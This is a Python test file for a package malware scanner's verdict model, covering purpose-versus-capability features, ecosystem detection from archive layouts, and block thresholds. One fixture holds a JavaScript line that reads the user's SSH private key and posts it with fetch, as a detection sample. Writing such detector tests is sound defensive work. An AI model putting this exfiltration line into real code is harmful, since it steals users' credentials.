"""What the package verdict reads about a package (`core/verdict.py`)."""

from __future__ import annotations

import gzip
import json
from unittest import mock

from cordon_scanner.core.models import (
    Category,
    Confidence,
    Evidence,
    EvidenceKind,
    Explanation,
    Finding,
    Location,
    RedactionMode,
    RiskScore,
    Severity,
)
from cordon_scanner.core.verdict import Verdict, VerdictFeatures, VerdictModel


class FeatureKit:
    @staticmethod
    def features(manifest: dict[str, object], code: bytes) -> dict[str, float]:
        return VerdictFeatures.package(
            [("p!package/package.json", 100), ("p!package/index.js", len(code))],
            {"p!package/package.json": json.dumps(manifest).encode()},
            [("p!package/index.js", code)],
        )


class TestPurposeAndAbility:
    def test_a_small_utility_that_reads_credentials_is_a_mismatch(self) -> None:
        found = FeatureKit.features(
            {"name": "color-format-lite", "description": "Format colours"},
            b'const k = require("fs").readFileSync(home + "/.ssh/id_rsa"); fetch(u, {body: k});',
        )
        assert found["purpose_ui"] == 1.0
        assert found["can_secret_paths"] == 1.0
        assert found["plain_with_sensitive"] == 1.0

    def test_an_http_client_that_makes_requests_is_not(self) -> None:
        found = FeatureKit.features(
            {"name": "tiny-api-client", "description": "A small REST client"},
            b"module.exports = (u) => fetch(u).then((r) => r.json());",
        )
        assert found["purpose_http"] == 1.0
        assert found["can_network"] == 1.0
        assert found["plain_with_sensitive"] == 0.0
        assert found["plain_with_process_net"] == 0.0

    def test_dependencies_code_is_not_the_packages_own(self) -> None:
        found = VerdictFeatures.package(
            [("p!package/package.json", 10)],
            {"p!package/package.json": json.dumps({"name": "x"}).encode()},
            [("p!package/node_modules/dep/index.js", b"require('child_process').exec(c)")],
        )
        assert found["can_process"] == 0.0

    def test_without_sources_every_ability_is_absent(self) -> None:
        found = VerdictFeatures.package([], {})
        assert all(value == 0.0 for key, value in found.items() if key.startswith("can_"))


class VerdictKit:
    """A one-split model: a package scores 0.9 when `r:SUSPECT.X.001` reaches HIGH, else 0.1."""

    @staticmethod
    def model(floor: tuple[str, ...] = ()) -> dict[str, object]:
        logit = 2.1972245773  # log(0.9 / 0.1)
        return {
            "format": VerdictModel.FORMAT,
            "features": ["r:SUSPECT.X.001"],
            "baseline": 0.0,
            "trees": [
                [
                    {
                        "leaf": False,
                        "feature": 0,
                        "threshold": 2.5,
                        "left": 1,
                        "right": 2,
                        "missing_left": True,
                    },
                    {"leaf": True, "value": -logit},
                    {"leaf": True, "value": logit},
                ]
            ],
            "areas": {"npm": 0.5, "package": 0.95},
            "floor": list(floor),
        }

    @staticmethod
    def finding(rule: str, severity: Severity, category: Category = Category.SUSPICIOUS) -> Finding:
        return Finding(
            rule_id=rule,
            category=category,
            severity=severity,
            confidence=Confidence.HIGH,
            message="m.",
            location=Location(path="package/index.js"),
            evidence=Evidence(
                kind=EvidenceKind.SNIPPET,
                match_hash=Evidence.hash_bytes(b"x"),
                redaction=RedactionMode.MASKED,
            ),
            remediation="",
            explanation=Explanation(summary="", matched_rule=rule),
            risk=RiskScore(value=50, base=50, confidence_multiplier=1.0),
            detector="t",
        )

    @staticmethod
    def decide(findings: list[Finding], model: dict[str, object], layout: str = "package/"):
        with mock.patch.object(VerdictModel, "load", return_value=model):
            return Verdict.decide(
                findings,
                [(f"{layout}package.json", 10), (f"{layout}index.js", 10)],
                {f"{layout}package.json": b'{"name": "x"}'},
            )


class TestTheShippedVerdict:
    def test_cosmetic_facts_are_never_scored(self) -> None:
        found = VerdictFeatures.evidence(
            [("SUSPECT.X.001", 3, 2, "suspicious", "package/index.js")],
            {"has_readme": 1.0, "desc_len": 40.0, "hook": 1.0},
        )
        assert "pkg:has_readme" not in found
        assert "pkg:desc_len" not in found
        assert found["pkg:hook"] == 1.0

    def test_evidence_only_rises_with_another_finding(self) -> None:
        one = VerdictFeatures.evidence([("SUSPECT.X.001", 2, 1, "suspicious", "a.js")], {})
        two = VerdictFeatures.evidence(
            [
                ("SUSPECT.X.001", 2, 1, "suspicious", "a.js"),
                ("SUSPECT.X.001", 3, 2, "suspicious", "SKILL.md"),
            ],
            {},
        )
        assert all(two[k] >= v for k, v in one.items())
        assert two["w:skilltext"] == 3.0

    def test_intel_secrets_and_its_own_finding_are_not_evidence(self) -> None:
        found = VerdictFeatures.evidence(
            [
                ("MALWARE.PACKAGE.KNOWN.001", 4, 3, "malicious", "."),
                ("SUSPECT.EXTENSION.REMOVED.001", 3, 2, "suspicious", ".vscode/extensions.json"),
                ("SECRET.AWS.001", 3, 2, "suspicious", "a.env"),
                (VerdictFeatures.OWN_RULE, 3, 1, "suspicious", "."),
            ],
            {},
        )
        assert found == {}

    def test_the_archive_layout_names_the_ecosystem(self) -> None:
        def area(*names: str) -> str:
            return Verdict.area(list(names), {}, {}, {})

        assert area("package/package.json", "package/index.js") == "npm"
        assert area("x-1.0/PKG-INFO", "x-1.0/x/__init__.py") == "pypi"
        assert area("x-1.0.dist-info/METADATA") == "pypi"
        assert area("extension.vsixmanifest", "extension/package.json") == "openvsx"
        assert area("src/main.go", "go.mod") == Verdict.FALLBACK

    def test_every_registry_release_format_has_a_line_of_its_own(self) -> None:
        # The layouts as each registry serves its releases (benign corpus, 2026-10-19).
        def area(*names: str) -> str:
            return Verdict.area(list(names), {}, {}, {})

        assert area("metadata.gz", "lib/x.rb") == "rubygems"
        assert area("x-0.1.0/Cargo.toml.orig", "x-0.1.0/src/lib.rs") == "crates"
        assert area("X.Client.nuspec", "lib/net45/X.Client.dll") == "nuget"
        assert area("META-INF/MANIFEST.MF", "at/x/A.class") == "maven"
        assert (
            area("bitbucket.org/a/rio@v0.0.0-2019/go.mod", "bitbucket.org/a/rio@v0.0.0-2019/f.go")
            == "go"
        )
        assert area("a-api-ec4f957/composer.json", "a-api-ec4f957/src/Api.php") == "packagist"
        assert area("AMAPVox/DESCRIPTION", "AMAPVox/R/A.R") == "cran"
        assert area("metadata.config", "mix.exs") == "hex"
        assert area("pubspec.yaml", "lib/acorn.dart") == "pub"

    def test_every_project_ecosystem_has_a_line_of_its_own(self) -> None:
        # The layouts as the benign corpus holds them (2026-10-19), one per ecosystem folder.
        def area(*names: str) -> str:
            return Verdict.area(list(names), {}, {}, {})

        assert area("info/index.json", "info/paths.json") == "conda"
        assert area("FILES.json", "MANIFEST.json", "roles/x/tasks/main.yml") == "galaxy"
        assert area("image-config/environment.env", "etc/passwd") == "image"
        assert area("x-1.0/x.podspec", "x-1.0/Sources/A.m") == "cocoapods"
        assert area("x-0.1/x.cabal", "x-0.1/src/A.hs") == "hackage"
        assert area("chart/Chart.yaml", "chart/values.yaml") == "helm"
        assert area("recipes_x/conanfile.py", "recipes_x/conandata.yml") == "conan"
        assert area("ports_x/portfile.cmake", "ports_x/vcpkg.json") == "vcpkg"
        assert area("x-1.0/x.opam", "x-1.0/src/a.ml") == "opam"
        assert area("Project.toml", "src/X.jl") == "julia"
        assert area("x-HEAD/Package.swift", "x-HEAD/Sources/A.swift") == "swift"
        assert area("x-1.0/MODULE.bazel", "x-1.0/BUILD.bazel") == "bazel"
        assert area("x-HEAD/settings.gradle", "x-HEAD/app/build.gradle") == "gradle"
        assert area("x-HEAD/flake.nix", "x-HEAD/flake.lock") == "nix"
        assert area("tap/Formula/x.rb") == "homebrew"
        assert area("module-abc/main.tf", "module-abc/variables.tf") == "terraform"
        assert area("owner_repo/action.yml", "owner_repo/dist/index.js") == "actions"
        assert area("owner_repo/.github/workflows/ci.yml") == "actions"
        # Measured misses of the first draft, each from a real corpus layout:
        assert area("tap/Casks/d/djv.rb") == "homebrew"
        assert area("tap/Casks/font/font-3/font-3270.rb") == "homebrew"
        assert area("sha256:" + "a" * 64, "manifest.json", "b" * 64 + ".tar.gz") == "image"
        assert area("github.com/x/mol@v0.0.0-2016/mol.go") == "go"
        assert area("App-HEAD/android/build.gradle", "App-HEAD/package.json") == "gradle"
        assert area("META-INF/maven/org.webjars.npm/x/pom.xml") == "maven"
        assert area("x-HEAD/Package.swift", "x-HEAD/x.podspec") == "swift"
        assert area("bap-2.5.0/OMakeroot", "bap-2.5.0/lib/a.ml") == "opam"
        assert area("t.tgz!aria-query/package.json", "t.tgz!aria-query/index.d.ts") == "npm"
        assert area("aria-query/package.json", "aria-query/index.d.ts") == Verdict.FALLBACK
        assert Verdict.area(["s/SKILL.md", "s/package.json"], {}, {"skill": 1.0}, {}) == "skill"

    def test_a_bundled_archive_does_not_name_the_ecosystem(self) -> None:
        # A Gradle repository carries gradle-wrapper.jar: its manifest is not a Maven release.
        names = [
            "r.tar.gz!r-HEAD/settings.gradle",
            "r.tar.gz!r-HEAD/gradle/wrapper/gradle-wrapper.jar!META-INF/MANIFEST.MF",
        ]
        assert Verdict.area(names, {}, {}, {}) == "gradle"
        assert (
            Verdict.area(["x.jar!META-INF/MANIFEST.MF", "x.jar!a/B.class"], {}, {}, {}) == "maven"
        )

    def test_a_repository_is_not_mistaken_for_a_release(self) -> None:
        def area(*names: str) -> str:
            return Verdict.area(list(names), {}, {}, {})

        assert area("go.mod", "cmd/main.go") == Verdict.FALLBACK
        assert area("composer.json", "src/A.php") == Verdict.FALLBACK
        assert area("Cargo.toml", "src/lib.rs") == Verdict.FALLBACK

    def test_a_registry_package_that_ships_a_skill_is_judged_by_its_registry(self) -> None:
        names = ["package/package.json", "package/skills/x/SKILL.md"]
        assert Verdict.area(names, {}, {"skill": 1.0}, {}) == "npm"
        assert Verdict.area(["x/SKILL.md", "x/run.sh"], {}, {"skill": 1.0}, {}) == "skill"

    def test_over_its_line_a_package_keeps_every_finding(self) -> None:
        findings = [VerdictKit.finding("SUSPECT.X.001", Severity.HIGH)]
        graded, summary = VerdictKit.decide(findings, VerdictKit.model())
        assert summary["area"] == "npm"
        assert summary["score"] >= summary["block"]
        assert graded == findings

    def test_under_its_line_a_malicious_finding_is_held_as_a_warning(self) -> None:
        findings = [
            VerdictKit.finding("MALWARE.Y.001", Severity.CRITICAL, Category.MALICIOUS),
            VerdictKit.finding("SUSPECT.Z.001", Severity.MEDIUM),
        ]
        graded, summary = VerdictKit.decide(findings, VerdictKit.model())
        assert summary["score"] < summary["block"]
        assert graded[0].severity == Severity.MEDIUM
        assert graded[0].category is Category.SUSPICIOUS
        assert graded[1] == findings[1]

    def test_the_floor_and_intel_are_never_held(self) -> None:
        findings = [
            VerdictKit.finding("MALWARE.Y.001", Severity.CRITICAL, Category.MALICIOUS),
            VerdictKit.finding("MALWARE.PACKAGE.KNOWN.001", Severity.CRITICAL, Category.MALICIOUS),
        ]
        graded, summary = VerdictKit.decide(findings, VerdictKit.model(floor=("MALWARE.Y.001",)))
        assert summary["score"] < summary["block"]
        assert graded == findings

    def test_an_unrecognised_package_answers_to_the_strictest_line(self) -> None:
        findings = [VerdictKit.finding("SUSPECT.X.001", Severity.HIGH)]
        graded, summary = VerdictKit.decide(findings, VerdictKit.model(), layout="src/")
        assert summary["area"] == Verdict.FALLBACK
        assert summary["block"] == 0.95
        assert graded[0].severity == Severity.MEDIUM

    def test_a_model_judges_only_the_ecosystems_in_its_scope(self) -> None:
        findings = [VerdictKit.finding("SUSPECT.X.001", Severity.HIGH)]
        scoped = {**VerdictKit.model(), "scope": ["pypi"]}
        graded, summary = VerdictKit.decide(findings, scoped)
        assert summary["area"] == "npm"
        assert "score" not in summary
        assert graded == findings

    def test_a_model_of_another_format_is_not_used(self, tmp_path) -> None:
        old = tmp_path / "verdict.json.gz"
        with gzip.open(old, "wt", encoding="utf-8") as handle:
            json.dump({"vocab": [], "trees": []}, handle)
        assert VerdictModel.load(old) is None

    def test_in_an_add_only_area_nothing_is_lifted(self) -> None:
        findings = [VerdictKit.finding("MALWARE.Y.001", Severity.CRITICAL, Category.MALICIOUS)]
        model = {**VerdictKit.model(), "add_only": ["npm"]}
        graded, summary = VerdictKit.decide(findings, model)
        assert summary["score"] < summary["block"]
        assert graded == findings


class TestDependenciesTheCodeNeverUses:
    def test_a_new_dependency_nothing_imports_is_counted(self) -> None:
        found = FeatureKit.features(
            {
                "name": "http-thing",
                "dependencies": {"follow-redirects": "^1", "zq-crypto-kit": "1"},
            },
            b"const r = require('follow-redirects/http');",
        )
        assert found["deps_unused"] == 1.0
        assert found["deps_unused_unknown"] == 1.0

    def test_a_dependency_named_by_a_script_or_an_import_is_used(self) -> None:
        found = FeatureKit.features(
            {
                "name": "x",
                "scripts": {"build": "rimraf dist && tsc"},
                "dependencies": {"rimraf": "5", "lodash": "4", "@types/node": "20"},
            },
            b"import get from 'lodash/get';",
        )
        assert found["deps_unused"] == 0.0


class TestWhatRunsOnItsOwn:
    def test_the_profile_names_what_install_time_code_can_do(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        root = tmp_path / "demo-1.0"
        root.mkdir()
        (root / "PKG-INFO").write_text(
            "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n", encoding="utf-8"
        )
        (root / "setup.py").write_text(
            "import subprocess\nfrom setuptools import setup\n"
            "subprocess.run(['echo', 'building'])\nsetup(name='demo', version='1.0')\n",
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        package = result.verdict["package"]
        assert package["install_files"] >= 1.0
        assert package["install_can_spawn"] == 1.0
